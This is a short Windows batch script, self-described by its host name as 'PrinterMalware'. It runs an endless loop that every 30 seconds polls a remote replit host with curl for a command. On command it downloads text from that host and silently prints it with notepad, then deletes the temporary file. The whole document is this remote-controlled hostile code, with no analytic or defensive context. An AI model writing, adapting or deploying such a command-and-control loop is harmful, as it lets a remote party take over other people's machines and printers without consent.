:x
FOR /F "tokens=*" %%g IN ('curl -0 "https://PrinterMalware.wraient.repl.co/doit/"') do (SET VAR=%%g)
if %VAR%==0 echo ""
if %VAR%==1 del test.txt
if %VAR%==1 FOR /F "tokens=*" %%g IN ('curl -0 "https://PrinterMalware.wraient.repl.co/content/"') do (SET TEXT=%%g)
if %VAR%==1 echo %TEXT% >> test.txt
if %VAR%==1 start /min notepad.exe /p test.txt
if %VAR%==1 del test.txt
timeout /t 30
goto x
